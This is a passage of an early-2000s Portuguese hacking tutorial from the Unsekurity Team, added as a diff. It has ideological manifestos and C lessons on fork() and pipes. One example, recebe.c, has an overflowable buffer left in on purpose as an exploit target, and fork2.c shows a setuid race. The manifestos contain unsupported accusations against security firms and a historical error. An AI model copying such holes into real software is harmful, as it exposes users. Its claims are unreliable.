@@ -1,0 +1,4220 @@
+#############################################################################
+############################## UNSEKURITY TEAM ##############################
+#############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+Thanks Unsekurity Team.
+
+Este e outros tutoriais podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+OBS: Nao nos responsabilizamos pelas informacoes aqui contidas, bem como
+     do mau uso dos exemplos e dados aqui fornecidos.Todo material
+     disponivel neste arquivo possui somente propositos educacionais.
+
+
+OBS2: Isso aqui nao eh um zine, nem pretende se tornar.Trata-se apenas de
+      um tutorial basico voltado para o pessoal NewBie, se voce eh 'elite',
+      por favor, nao leia! Voce nao encontrarah informacoes uteis aqui.
+     
+
+		***************************************
+		*  PROGRAMACAO BASICA PARA FUCADORES  *
+		***************************************
+
+------------------------------- INDICE ----------------------------------
+
+1. INTRODUCAO
+2. MANIFESTOS
+   2.1. - A confusao dos Termos
+   2.2. - A Comunidade de Seguranca e Voce
+   2.3. - Codigo Aberto x Codigo Fechado
+   2.4. - O Lucro com o Hacking
+3. INTRODUCAO A IPC (InterProcess Comunication)
+   3.1. - Porque Aprender sobre IPC
+   3.2. - fork()
+   3.3. - Pipes
+   3.4. - Signals
+4. Problemas Simples de Seguranca
+   4.1. - popen() + Environment
+   4.2. - Problemas com system()
+   4.3. - Problemas com Shell Scripts
+   4.4. - Chamadas Para vi
+   4.5. - Problemas com File Descriptors
+5. LKM (Loadable Kernel Modules)
+   5.1. -  Para que Aprender a Escrever LKMs
+   5.2. -  Carregando e Descarregando um LKM
+   5.3. -  Duas Funcoes Minimas
+   5.4. -  Systemcalls
+   5.5. -  Kernel-Symbols-Table
+   5.6. -  Transformando Memoria do Kernel Space p/ User Space
+   5.7. -  Meios de Usar User Space como Funcoes
+   5.8. -  Lista de Funcoes usadas em Kernel Space
+   5.9. -  O que eh um Kernel Daemon
+   5.10. - Criando Seu Proprio Device
+   5.11. - Alguns Macros
+   5.12. - Esquemas para Fucadores
+6. Shared Library
+   6.1. - O que sao
+   6.2. - Algumas Funcoes
+   6.3. - Tecnica de Redirecionamento
+   6.4. - Outros Esquemas
+7. TERMINANDO
+   7.1. Links e Referencias
+   7.2. Consideracoes Finais
+
+-------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+Demorou, mais aih estah a uniao de varios topicos de programacao
+relacionados ao mundo fucador.Topicos basicos, mas que requerem
+conhecimentos em C e Linux. Resolvi incorporar a este tutorial uma parte
+com manifestos sobre varios temas, nao pretendo despertar odio com isso
+e sim, abrir a discussao em torno de alguns pontos 'nao-tecnicos' que
+envolvem o mundo do fucador.Cada item do tutorial tem como alvo os
+mesmo leitores dos tutoriais anteriores, ou seja, Fucadores NewBies.
+Fica avisado novamente que se voce eh 'elite' nao acharah nada util
+neste tutorial.
+
+----------------
+2. - MANIFESTOS |
+----------------
+
+OBSERVACAO: OS PENSAMENTOS EXPRESSOS NESTE ITEM SAO DE MINHA AUTORIA, 
+	    SAO DE MINHA PESSOA.O UNSEKURITY TEAM DAH AOS SEUS MEMBROS A
+	    LIBERDADE PARA SE EXPRESSAR DA MANEIRA QUE BEM ENTENDER.NO
+	    ENTANTO, CADA MEMBRO POSSUI SEU PROPRIO MODO DE VER AS COISAS.
+	    AS COISAS QUE ESCREVO AQUI NAO SAO COMPARTILHADAS POR TODOS
+	    DO UNSEKURITY TEAM, E A RESPONSABILIDADE PELAS LINHAS QUE 
+	    SE ENCONTRAM NESTE ITEM CABE A MINHA PESSOA, NASH LEON,
+	    ESTANDO DESDE JAH CLARO QUE EH UMA ATITUDE ISOLADA! AVISO
+	    AO LEITOR QUE ELE NAO DEVE JULGAR O UNSEKURITY TEAM ATRAVES
+	    DAS PALAVRAS E PENSAMENTOS DE UM SOH MEMBRO.
+
+
+"Conhecereis a verdade e ela vos libertarah"
+
+"De que adianta ter um excelente conhecimento tecnico sobre o hacking,
+mas seguir por caminhos detestaveis pela comunidade hacker???".O que
+quero nesta parte eh compartilhar um pouco da minha opiniao sobre alguns
+assuntos nao-tecnicos, mas que envolvem o mundo do fucador.Nao adianta
+nada eu escrever 2 mil linhas de textos tecnicos para um cara se tornar
+cracker ou ser moldado como um fantoche de grandes empresas porque nao
+foi bem informado! Se nao tivermos o minimo de senso critico, certamente
+seremos facilmente enganados por esta corja que aih se encontra.Vou dizer
+o que penso sobre determinados temas, mas o intuito aqui eh fazer voce 
+pensar sobre eles usando seu proprio senso critico e buscando a verdade
+atras do fatos.Se pergunte sobre os porques, levante duvidas, raciocine!
+Meus txts ganharam a abrangencia que eu desejava, mas de nada adiantarah
+expandir os conhecimentos tecnicos se nao puder dar a conhecer alguns
+pensamentos 'eticos'.Se esta parte te interessa recomendo a voce le-la
+com bastante calma, sendo critico e procurando ver o que estah por tras
+de cada afirmacao! Se voce pensa igual ou diferente, nao importa! Eu
+quero apenas que voce pense! Seja Critico!!
+
+2.1. - A confusao dos Termos
+-----------------------------
+
+O que eh ser hacker afinal?? O que eh ser um fucador??? 
+A midia, como em tudo, demonstra ignorancia quanto a verdade, alienando mais
+e mais pessoas.A parte podre da comunidade de seguranca nao pensa em outra
+coisa a nao ser 'sujar' a definicao ao maximo.E voce, sabe o que eh ser
+um hacker??? 
+
+A origem do termo hacker remonta aos primordios da revolucao tecnologica.
+Na verdade, se for levar ao peh da letra, os hackers derivam dos phreaks,
+que se originaram nos primordios da invencao do Telefone.Mas no entanto,
+o termo soh veio se popularizar depois que os phreaks comecaram a se 
+difundir em larga escala, isso se deu no inicio da decada de 70, mais ou
+menos.A inspiracao maior no mundo 'phreak' deu inicio com john draper
+vulgo Capitao Crunch, ele descobriu um metodo de fazer ligacoes gratuitas
+usando um apito que vinha numa caixa de cereais.A popularizacao desta
+tecnica levou dois jovens inescrupulosos a automatizarem o processo, 
+criando as famosas RED BOX, esses dois individuos se chamam Steve Jobs
+e Steve Wosniak(Ambos fundadores da APPLE).Desde entao houve um 
+crescimento consideravel das tecnicas e meios de manipular o sistema
+Telefonico americano.Enquanto os phreaks cresciam em numero e
+conhecimentos, no MIT(Instituto Tecnologico de Massachussets), estudantes
+arrombaravam salas de informatica a noite para poderem aprender mais sobre
+os carissimos Sistemas de Computadores.A palavra hacker em ingles significa 
+'machado de duas pontas', muito provavelmente eles usavam isso para
+quebrarem os cadeados, ou o proprio comportamento deles se assemelhava a
+isso.Eles queriam obter conhecimentos a qualquer custo.O conceito 'hacker'
+expandiu, ou seja, varias pessoas queriam dominar um conhecimento cada
+vez maior sobre algo, nao importando os meios que usassem.'A busca pelo
+conhecimento eh uma atividade basica do ser humano', logo nao deve ser
+repelida.Durante a decada de 80 muita coisa aconteceu no cenario hacker-
+phreak, levando desde perseguicao, criacao de leis rigorosas ateh uma
+maior compreensao de algumas entidades e a criacao de varias 'entidades'
+de defesa dos ideais e interesse dos hackers... O que chamo aqui de
+entidade, nao eh nada relacionado ao que conhecemos por entidade, eh mais
+alem, algumas delas eh fundamental um fucador conhecer, como a Eletronic
+Frountier Foundation(EFF), a 2600(o quartel general hacker), e etc.
+
+Se voce for buscar a verdade bem no fundo verah que quase tudo relacionado
+a informatica hoje em dia teve uma colaboracao maior de hackers.Internet,
+PC, Softwares Gratuitos, enfim os hackers se expandiram em todos os
+segmentos da informatica aprimorando-os sempre.A relacao do hacker e do
+phreak eh mais alem, no inicio os phreaks lutavam contra as grandes
+companhias telefonicas, as grandes corporacoes e os governos, nao possuiam
+nacionalidade e nao defendiam uma etnia, eram livres e os unicos 'inimigos'
+era justamente esses jah citados.Invadiam sistemas telefonicos, ensinavam
+truques para se fazer ligacao gratuita, etc.. Os hackers tambem trilharam
+o mesmo caminho unido forcas e lutando pelos mesmos ideiais, desafiando
+os mesmos inimigos e divulgando o que consideravam a sua maior bandeira:
+"A LIBERDADE DE INFORMACAO", isto culminou em 1984 com a criacao do projeto
+GNU, criado por um hacker.Desde jah fica evidente que um hacker nao 
+trabalha para grandes corporacoes ou empresas sem escrupulos(Microsoft,
+Conectiva, Sun, Apple, Intel e etc).. Sim, os hackers lutavam contra
+empresas deste tipo e continuam lutando!! Mas eles(os inimigos) tem os
+meios de comunicacao, possuem os governos em suas maos, entao logo veio a
+retaliacao,e uma verdadeira caca as bruxas ocorreu no Estados Unidos em 
+1990/1991,batizada de Operacao SunDevil, muita gente inocente foi presa 
+e vidas foram acabadas.
+
+No brasil, somente na decada de 90 veio a ocorrer uma maior divulgacao do
+termo hacker e da etica hacker, o zine 'Barata eletrica' de Denerval
+Cunha foi e tem sido quem mais expandiu o que representa a etica hacker
+e a 'cultura' pregada pelo hacking.Este zine eh leitura obrigatoria para
+qualquer fucador etico!
+
+Os termos hoje em dia estao confusos, muita gente prefere nao ser
+considerado como hacker pois pode ser banalizado ou mesmo prejudicado, a
+ofensiva dos 'inimigos' foi grande, e os verdadeiros hackers tem sofrido
+na pele a consequencia desta 'guerra'! Ainda ha muito para ser feito, 
+muita gente possui total ignorancia quanto aos termos, mas o que devemos
+sempre deixar claro eh que hacker nao eh cracker, e que a Comunidade de
+Seguranca nao eh, nunca foi, e nunca vai ser aliada dos hackers, eles
+fazem parte do sistema!!! Sabemos que existe gente seria na Seguranca, eh
+o que chamamos de 'parte boa' da Seguranca, no entando a maioria nao o
+eh, eh o que chamamos de 'BANDA PODRE!'. Um hacker nao muda home page ou
+destroi um sistema, quem faz isso sao kiddies ou lamers, sejamos bem
+evidentes nisso!!! Mesmo que chamem para questoes ideologicas, nao faz
+parte do hacking qualquer ideologia NACIONALISTA!! A Comunidade hacker
+eh uma soh, assim como as grandes corporacoes o sao, ou voce acha que
+a Microsoft Brasil e melhor, mais legal, mais escrupulosa do que a
+Microsoft USA?? 
+
+Quanto aos crackers, eles tem levado vantagem em tudo, com o termo hacker
+derrubado, com hackers de verdade sendo perseguidos, esses crackers tem
+vencido a batalha..A comunidade de seguranca nunca foi competente o
+bastante, os hackers ajudam, mas 'a banda podre' nao ve com bons olhos,
+termina os crackers se dando bem e os hackers e os usuarios normais
+saindo prejudicados. Agora eu te pergunto, a comunidade de seguranca
+ganha ou perde com os crackers??? Ao meu ver eles ganham, por isso, ao
+meu ver, Crackers e Banda Podre da Comunidade de Seguranca sao um soh!!!
+Abra os olhos, a verdade tah procurando voce!!!
+
+2.2. - A Comunidade de Seguranca e Voce
+------------------------------------------
+
+Temos que saber diferenciar o que estah por tras.No item anterior eu falei
+sobre dois lados da Comunidade de Seguranca, a banda podre e a "parte boa"
+(parte boa entre aspas).
+Se voce eh um fucador experiente certamente sabe mais coisas sobre isto
+do que eu, mas falarei um pouco do que eu acho, para que os mais novos
+possam levantar criticas.
+Podemos dividir a comunidade de Seguranca em 4 grupos, vejamos abaixo:
+
+* OS DESINFORMADOS
+-------------------
+
+Estes sao aqueles que nao conhecem o que eh hacker, nem o que eh cracker.
+Nao conhecem a historia da informatica, nao sabem a origem da Seguranca
+de Sistemas Informatizados, e sao 'moldados' pela banda podre da
+comunidade de seguranca e pela midia.Na grande maioria sao estudantes
+universitarios ou recem formados que partiram para a Seguranca porque eh
+o que mais dah dinheiro hoje em dia, se desse mais dinheiro mexer com
+outra coisa, eles estariam lah com certeza.Nao possuem a paixao pelo que
+fazem e odeiam os hackers puramente porque foram 'ensinados' a odiarem.
+Esta eh a parte mais inofensiva que existe, e a unica que ainda pode ser
+'ganha' para a causa, ou seja, ainda podemos mudar a opniao deles quanto
+ao termo hacker.Necessitam de ajuda, pois nao possuem a malicia, e nao
+conhecem a capacidade de um cracker.
+
+* OS MEDROSOS
+-------------- 
+
+Essa eh uma 'classe' esquisita da Comunidade de Seguranca.Sao pessoas
+que sabem diferenciar os termos crackers e hackers, simpatizam com as
+ideologias dos hackers, conseguem ver a beleza da etica, no entanto temem!
+Temem perderem seus empregos para hackers com maiores conhecimentos! Temem
+perderem seus empregos se defenderem os hackers em alguma situacao!!Temem!!
+Na maioria sao pessoas com bons conhecimentos tecnicos, mas trabalhando em
+empresas erradas! Costumam ficarem quietos, nao opinando em quase nada
+fora do 'assunto tecnico'.Alguns possuem uma vontade de libertar o
+espirito hacker de dentro dele, mas algo nao permite, temem morrerem de
+fome por defenderem a causa hacker, temem muitas outras coisas, por isso
+sao considerados como os medrosos!!
+
+* A BANDA PODRE
+----------------
+
+A banda podre eh bem ramificada.Na grande maioria sao altos funcionarios
+de grandes empresas(Microsoft, NAI,Norton, etc), que detonam o termo hacker
+porque os hackers sao os unicos que os denunciam.Sao esses que se alegram 
+quando um cracker consegue fazer algo grandioso pois eles irao lucrar 
+vendendo mais seus produtos e servicos.Defendem com unhas e dentes os 
+produtos que comercializam, mesmo chegando as vezes a falarem 'loucuras'
+para poderem enganar os que nao enxergam o que estah por tras dos seus
+interesses.Alguns fabricam virus, colocam a culpa nos hackers(hackers nao
+publicam virus) e depois vendem antitodos e antivirus para combaterem a
+praga que eles mesmo criaram.Outras empresas se unem a governos e fraudam
+o processo elitoral para que um determinado 'candidato' venca para depois
+assinar um contrato milionario com a empresa.Essas pessoas representam
+aquelas grandes corporacoes que vimos no item anterior, e elas eh quem
+devemos denunciar!
+
+* A PARTE BOA
+--------------
+
+A parte boa eh representada por alguns membros(menos de 0,01%) da Comunidade
+de Seguranca que acreditam nos ideiais hackers, divulgam o sentido dos
+termos, ajudam hackers quando perseguidos, se aliam a hackers para
+denunciar problemas com a 'banda podre' e as empresas representadas por
+esta 'banda podre', e principalmente lutam pela seguranca por usuarios
+comuns.Essa parte boa goza de um prestigio grande na Comunidade Hacker e
+sao sempre bem quistos.Alguns abandonam a Comunidade de Seguranca e passam
+a fazer frente na Comunidade Hacker, outros acreditam que estar na
+Comunidade de Seguranca serve como estrategia para 'derrubar' as
+corporacoes inescrupulosas e a 'parte podre'.Esses profissionais possuem
+o meu total respeito e consideracao.
+
+Agora que voce sabe quem eh quem, abra os olhos para nao ser ludibriado.
+Cuidado com 'as raposas vestidas de cordeiros'.Fique atento sempre!!
+Seja Critico!
+
+2.3. - Codigo Aberto x Codigo Fechado
+--------------------------------------
+
+Essa discussao vem ganhando ambito, principalmente no que se pode chamar de
+'guerra' entre Windows e Linux.O que voce acha mano, codigo fonte aberto
+eh mais seguro do que fechado?? Para um hacker o que eh melhor??
+Irei expor minha opiniao sobre isso, analise voce mesmo e tire suas
+conclusoes.
+
+O codigo aberto nada mais eh do que a exposicao total dos codigos fontes
+que serao usados por determinada aplicacao ou programa.Essa filosofia
+ganhou forca apos a criacao do projeto GNU que tornava livre os softwares.
+Muitos sistemas adotam esta filosofia, inclusive o Sistema Operacional
+OPENBSD considerado atualmente como o sistema operacional mais seguro que
+existe.Esse exemplo por sih soh jah mostra que o codigo fonte aberto eh
+algo bom para a seguranca de um Sistema Operacional.A guerra que vem sendo
+travada no momento eh Linux x Windows, e nao OpenBSD x Windows, consegue
+entender?? A Microsoft tem perdido fatia no mercado para o Linux, entao
+ela precisa atacar o Linux de alguma forma e o alvo escolhido foi o
+conceito 'Codigo Fonte Aberto'.Para um hacker o que eh melhor, aberto
+ou fechado???E para um cracker?? Por que pessoas defendem o codigo fonte
+fechado?? Respostas a essas perguntas seguem abaixo:
+
++ Para um hacker, o que eh melhor em busca de 'LIBERDADE DE INFORMACAO' e
+  a seguranca dos usuarios comuns, eh o melhor para ele.No primeiro ponto,
+  o codigo fonte aberto proporciona um maior intercambio, maior troca de
+  informacoes, uma evolucao maior no aprendizado da informatica.Com o
+  codigo fonte aberto varios usuarios podem opinar, melhorar o programa,
+  apontar erros e solucoes, podem 'personalizar' o sistema.A seguranca
+  tende a aumentar, pois muita gente estarah analisando os codigos, seja
+  em busca de bugs ateh backdoors,para o usuario comum isto eh lucro!
+  Entao o codigo fonte aberto soh traz beneficios, logo, um hacker defende
+  o aumento deste conceito, pois todos tem a ganhar, exceto os inimigos 
+  dos hackers, que vimos anteriormente, pois eles sobrevivem no ocultismo.
+
++ Para um cracker o software aberto eh uma barreira.Torna a longo prazo,
+  mais dificil dele penetrar nos sistemas, e a instalacao de backdoors e
+  virus passa a ser infinitamente mais visivel que num codigo fechado.A
+  troca de informacoes prejudica a acao de crackers, pois uma tecnica que
+  ele domina hoje eh mais rapidamente combatida com a troca de informacoes,
+  jah que a solucao nao estarah somente nas maos de 1 unica empresa.Nao se
+  iluda amigo, os crackers hoje em dia possuem conhecimentos maiores que a
+  atual Comunidade de Seguranca! 
+
++ Mas vemos pessoas defenderem o uso de softwares com codigo fonte fechado!
+  Nao podemos generalizar, mas nesse ponto, ao meu ver, as pessoas que
+  defendem o uso de software de codigo fechado podem ser divididas em dois
+  grupos.Sao eles:
+
+  * Os Desinformados -> Falta conhecimentos sobre tecnicas usadas por crackers
+    e nao conhecem nem mesmo as estatisticas divulgadas de invasoes.Acham
+    que crackers nao possuem conhecimentos superiores aos deles e creem que
+    uma forma de barrar a acao dos crackers eh justamente limitar a
+    'liberdade de informacao'.Chegam ao cumulo de acharem que crackers
+    aprendem atraves de mail list como bugtraq!! Crackers e Hackers estao
+    ha alguns passos do que eles consideram 'conhecimento tecnico avancado'
+    de pratica de seguranca.A grande maioria dessas pessoas obedecem ao ego
+    e por isso possuem sua parte de culpa 'no crescimento dos crimes de
+    informatica'.
+
+  * Os Inescrupulosos -> Esses sao os que defendem pensando em interesse
+    proprio.Nao se importa com o usuario comum e defendem o codigo fonte
+    fechado porque trabalham para empresas que usam codigo fonte fechado!
+    Sao pessoas inescrupulosas, pois conhecem a verdade, mas defendem a
+    mentira unicamente para obterem vantagens pessoais.Pregam a obscuridade
+    em tudo, ou seja, jamais ensinam o que aprenderam(olha que na maioria
+    das vezes eles aprendem com hackers!).Temem que um maior crescimento
+    da conciencia de software livre e liberdade de informacao possam deixa-los
+    desempregados.Sao pessoas capazes de fazerem coisas 'monstruosas' para
+    defenderem seus lucros, inclusive injetarem backdoors nos seus produtos 
+    a mando de um governo qualquer(vide chave NSA).
+
+Eh bastante comum em mail lists aparecem mensagens de pessoas que defendem
+o codigo fonte fechado.Muita discussao rola sobre isso, mas amigo, o
+pessoal mais velho jah conhece muito bem essas figuras.Nao perca seu tempo
+discutindo em mail lists, o que eu tenho visto ultimamente, eh um monte de
+gente defendendo empresas sem escrupulos(Microsoft,SUN, Red Hat, Conectiva, 
+etc, etc e etc) por interesses proprios.Nao se preocupe, pois qualquer um 
+com conhecimentos basicos de informatica sabe que essas empresas nao sao 
+boas na parte tecnica e pessimas na parte etica.E alem de tudo, a verdade
+eh uma soh e ela se manifesta no tempo apropriado!
+
+2.4. - O Lucro com o Hacking
+-----------------------------
+
+Livros, revistas, jornais, filmes,patrocinios em home pages e etc..
+Atualmente falar sobre hackers eh alvo rentavel, existem dezenas de livros
+que vendem 'tecnicas milagrosas' para se invadir redes como a do pentagono.
+Existem sites que esbanjam o nome 'HACKER' em atividades criminosas em
+busca de obter retorno de investimento.Membros da parte podre da comunidade
+de seguranca dando cursos e mais cursos visando nada mais nada menos do
+que formulas de como se livrar dos hackers.Jornalistas inescrupulosos atras
+de 'ibope' e ascensao meteorica na carreira entrevistando criminosos e
+criancas que se dizem hackers.Essas pessoas sao despreziveis, sua essencia
+eh desprezivel.
+
+O hacking eh maior do que tudo isto, a beleza do hacking nao pode ser
+comercializada, pois pouca gente conseguiria visualizar a leveza e
+grandiosidade que envolve a etica hacker.As pessoas hoje em dia buscam
+lucro em tudo que se pode imaginar, e o hacking nao eh diferente.
+Quanto mais catastrofico o cenario, melhor para essas pessoas, no entanto,
+o hacking tem superado isto tudo e permanece vivo apos todas essas
+sucessivas 'difamacoes'.Temos pessoas ainda hoje em dia que contemplam a
+verdade e buscam viver a verdade.Nenhuma riqueza no mundo eh capaz de
+alegrar o coracao de um fucador como o hacking etico consegue fazer.
+Mesmo com toda essa 'sujeira' ainda existe uma esperanca e eh por isso
+que escrevo.O hacking puro eh capaz de mudar mentalidades e fazer
+transparecer a verdade, verdade estah que estah oculta aos olhos da
+maioria das pessoas.A etica hacker eh capaz de nos ensinar valores morais
+que toda a sociedade se alegraria em ver! 
+
+O hacker nao eh nacionalista,ele busca a paz, nao eh ganancioso e nem 
+capitalista, ele eh democratico, eh sincero, eh verdadeiro.Um hacker eh
+um sonhador, eh um revolucionario, eh um co-irmao de todos os oprimidos e
+discriminados.Um hacker eh justo e fiel, se apega a seus principios e
+morre defendendo eles.A etica hacker estah alem de uma pessoa soh, estah
+alem de uma comunidade soh ou de um pensamento soh! A essencia do hacker
+eh a liberdade! Liberdade esta verdadeira, nao a pregada por governos.
+
+Um hacker eh um guerreiro, um guerreiro em fase de extincao!
+
+Este eh o meu pensamento sobre esses assuntos.Tem muito mais coisas para
+se discutir.A etica hacker nao eh um pensamento de um soh homem.Existem
+bons textos que divulgam 'a etica hacker em sua essencia', recomendo a
+leitura do zine Barata Eletrica, lah voce poderah encontrar informacoes
+valiosissimas! Estou aberto a discussao e a receber opinioes sobre esses
+assuntos, meu e-mail estah a disposicao. Seja critico nas coisas que eu
+escrevi, pergunte a sih mesmo se o que escrevi eh verdade, se essas coisas
+sao assim mesmo, busque voce mesmo formar a sua opiniao a respeito desses
+assuntos, nao deixe nunca alguem "escravizar a sua mente".As dificuldades
+da vida sao muitas, e pessoas mudam... Mas os feitos permanecem, e se
+conseguir enxergar os feitos, verah a grandiosidade ou a monstruosidade 
+das pessoas!
+
+HACK THE PLANET!!!!
+
+------------------------------------------------
+3. INTRODUCAO A IPC (InterProcess Comunication) |
+------------------------------------------------
+
+Alguns topicos descritos aqui requerem conhecimentos basicos de C e Linux.
+Mais uma vez teclo numa tecla, descreverei somente o basico de IPC, se
+voce jah sabe tudo, nao perca seu tempo, algo mais completo sobre este
+item, em breve estarah disponivel, aguarde!
+
+3.1. - Porque Aprender sobre IPC
+---------------------------------
+
+Sem sombra de duvidas, um fucador quer aprender tudo que possa um dia vir
+a ser util para o mesmo.Sao tantas as coisas para se aprender, que hoje
+em dia eh muito dificil um soh fucador obter conhecimentos sobre todas as
+tecnicas e artimanhas que rondam o "mundo virtual" de um fucador, pode-se
+ateh considerar isto como "quase" 'impossivel', mas nesse mundo virtual,
+nada deve ser considerado como sendo impossivel.IPC eh uma parte da
+programacao que se refere a escrita de programas que se comunicam, como
+assim se comunicam? Esses programas podem ser descritos como programas que
+se interagem, seja no seu funcionamento normal(Exemplo: Cliente/Servidor)
+ou numa simples chamada de execucao de um programa por outro(Exemplo: Usar
+execl num programa qualquer).Um exemplo bastante util de IPC sao os
+sockets,porque seus processos se comunicam, eh por isso que programacao de
+sockets eh considerado como sendo uma das inumeras ramificacoes de IPC.
+Outro exemplo simples de IPC encontra-se na execucao de exploits para
+buffer overflows, e eis aih o principal motivo para aprendermos sobre IPC.
+Mas alem de exploits p/ overflows, IPC pode ser utilizado por um fucador
+para varios objetivos, pois melhora consideravelmente as solucoes para
+eventuais problemas, alguns exemplos de programas sao melhores
+construidos e executados com o uso de IPC sao: Sniffers, Programas que
+agem com multiplexacao de Entrada e Saida(TTY HIJACKING), Craqueadores
+(Desencriptadores), Scanners(Multiplas entradas e saidas, tambem multiplos
+sockets) e etc.Enfim, sao varios as possiveis utilizacoes dessa tecnica de
+programacao por parte de fucadores.Irei descrever algumas delas, coisas
+basicas, nao quero entrar em conceitos mais complexos e muito menos em
+tecnicas de algoritmos mais complexas e eficientes, tentarei ser o mais
+pratico possivel.
+
+3.2. - fork()
+--------------
+
+Para que possamos entender bem uma interacao entre processos, eh necessario
+que saibamos o que eh um processo pai e um processo filho.O Linux nos
+permite a interecao de mais de um programa usando um processo superior,
+ou seja, voce executa apenas um programa e ele irah executar varios, ou
+interagir com varios, executar diversas acoes, e etc atraves da criacao de
+processos inferiores(filhos) que se interligam ao processo superior(pai).
+Um meio de se fazer isso eh atraves da funcao fork().Ela eh responsavel 
+pela criacao de um processo filho.
+
+O que a funcao fork() faz eh somente criar um processo filho.Sua sintaxe
+segue abaixo:
+
+#include <unistd.h>
+
+pid_t fork(void);
+
+Vamos analisar o exemplo abaixo do uso da funcao fork().
+
+------------------------------ fork1.c ---------------------------------
+#include <errno.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+main(){
+pid_t pid;
+int rv;
+
+switch(pid=fork()) {
+case -1:
+perror("fork");
+exit(1);
+
+case 0:
+printf("FILHO: Eu sou o processo filho!\n");
+printf("FILHO: Meu PID eh %d\n", getpid());
+printf("FILHO: O PID do meu pai eh %d\n", getppid());
+printf("FILHO: Digite o meu status de saida(numero pequeno): ");
+scanf(" %d", &rv);
+printf("FILHO: Vou sair com meu pai!\n\n");
+exit(rv);
+
+default:
+printf("PAI: Eu sou o processo pai!\n");
+printf("PAI: Meu PID eh %d\n", getpid());
+printf("PAI: O PID do meu filho eh %d\n", pid);
+printf("PAI: Eu estou agora esperando pelo meu filho para sair...\n\n");
+wait(&rv);
+printf("PAI: Status de saida do meu filho eh: %d\n",WEXITSTATUS(rv));
+printf("PAI: Estamos saindo daqui!\n\n");
+      }
+return 0;
+}
+---------------------------------------------------------------------------
+
+Compile o exemplo acima e execute-o.Abra outro console e quando ele pedir
+para voce digitar o status para saida, no outro console voce digita 
+'ps aux', vejamos:
+
++ Num Console:
+
+$ ./fork1
+PAI: Eu sou o processo pai!
+PAI: Meu PID eh 204
+PAI: O PID do meu filho eh 205
+PAI: Eu estou agora esperando pelo meu filho para sair...
+
+FILHO: Eu sou o processo filho!
+FILHO: Meu PID eh 205
+FILHO: O PID do meu pai eh 204
+FILHO: Digite o meu status de saida(numero pequeno):
+
++ No outro Console: 
+
+$ ps aux
+...
+nashleon   204  0.0  3.4  1028  356 tty3     S    10:53   0:00 ./fork1
+nashleon   205  0.0  3.6  1032  376 tty3     S    10:53   0:00 ./fork1
+nashleon   206  0.0  9.5  2612  972 tty4     R    10:54   0:00 ps aux
+ 
+Note que realmente eh criado um processo filho(205).Vejamos outro exemplo
+para que voce possa ir vendo na pratica o uso de fork().
+
+------------------------------- fork2.c ---------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int algo();
+main(){
+char opcao[2];
+printf("\n**** MENU DE ACOES ****\n\n");
+printf("1 - Executar Algo ; 2 - Sair\n\n");
+printf("Digite a opcao desejada: ");
+scanf("%1s",opcao);
+if(!strcmp(opcao,"1")){
+algo();
+exit(0);
+}
+if(!strcmp(opcao,"2")){
+printf("Saindo..\n");
+exit(0);
+}
+printf("Opcao Errada!!\n");
+return 0;
+}
+int algo(){
+printf("Preparando para registrar tentativa de login mal sucedida...\n");
+usleep(1000000);
+if(!fork()){
+/* Soh para ilustrar algumas possibilidades */
+setuid(0);
+printf("Analisando registro de logs!!\n");
+printf("Atualizando Daemon!!\n");
+printf("Usuario logado no sistema!!\n");
+exit(0);
+}
+setuid(getuid());
+usleep(1000000);
+printf("Daemon Rodando Normalmente!!\n");
+return 0;
+}
+-------------------------------------------------------------------------
+
+Este programa eh apenas ilustrativo, pode-se contemplar um problema de
+race condition nele.O importante eh notarmos que ele cria um processo
+filho para executar uma tarefa enquanto o processo pai fica "esperando",
+entre aspas, pois ele nao espera uma respostas do processo filho para dar
+continuidade a execucao de sua tarefa, no exemplo anterior havia uma
+interacao entre os processos, neste exemplo acima, na verdade nao existe.
+Milhares de programas sao criados usando fork(), mais abaixo,na parte de
+problemas com File Descriptores voce poderah saber mais sobre algumas 
+tecnicas usadas por fucadores em cima disso.
+
+3.3. - Pipes
+-------------
+
+Qualquer usuario de sistemas Linux(DOS tem tambem) sabe o que eh o pipe
+symbol(|) e o que ele faz.Pode-se dizer que o pipe symbol eh responsavel
+pela execucao de uma Comunicacao entre Processos, executando algumas vezes
+dois ou mais processos ao mesmo tempo.Vejamos um simples exemplo disso:
+
+[localhost:]# cat /etc/passwd | grep 'adm'
+adm:x:3:4:adm:/var/log:
+
+No exemplo acima podemos notar a Interacao entre os processos.Existem
+inumeros possiveis exemplos de uso de um pipe symbol em Linux, mas esse
+topico(pipes) eh bem mais amplo.
+Um programa em C eh capaz de executar Interacoes entre Processos como o
+exemplo acima citado, sendo que na linha de comando do Linux existe uma
+restricao muito grande, coisa que eh sanada com a escrita de programas
+em C que usam pipes.Veremos abaixo como criar programas desse tipo.
+
+3.2.1 - Criando Pipes em C
+---------------------------
+
+Antes de comecarmos, qualquer duvida referente a qualquer funcao deve
+antes de mais nada tentar ser solucionada via man pages.As man pages,
+assim como qualquer documentacao no Linux, ajudam sempre o usuario na
+solucao de problemas, se todos lessem as man pages, com certeza nao
+teriamos tanto lixo nas nossas contas de e-mails vindo de mail lists.
+Veremos como fazer dois ou mais processos se comunicarem via pipe:
+
+* Primeiro abrimos um pipe.O Linux permite dois meios de se abrir um
+  pipe, sao eles via:
+
++ popen() -> FILE *popen(char *comando, char *tipo)
+
+  Cria um pipe para I/O(Entrada e/ou Saida) onde o "comando" eh o processo
+  que se conectarah(comunicarah) com o outro processo chamada pela criacao
+  do pipe.O tipo pode ser "r" para leitura ou "w" para escrita.
+  Um pipe aberto por popen() deve ser fechado por pclose(FILE *stream).
+  Usamos fprintf() e fscanf() para se comunicar com o stream do pipe.
+  Vejamos um exemplo abaixo:
+
+--------------------------------recebe.c-------------------------------
+/* PROGRAMA QUE IRAH SERVIR DE EXEMPLO PARA IPC VIA POPEN() */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+main(){
+char buffer[10],buffer2[20];
+printf("Digite seu nome: ");
+scanf("%s",buffer2);
+strcpy(buffer,buffer2);
+printf("Seja bem vindo %s.\n",buffer);
+}
+-------------------------------------------------------------------------
+
+Compile o programa acima, ele irah servir de exemplo para nosso programa
+IPC que irah se comunicar com este programa acima.
+
+-------------------------------envia1.c----------------------------------
+
+/* Simples Exemplo de PIPE via popen(). */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
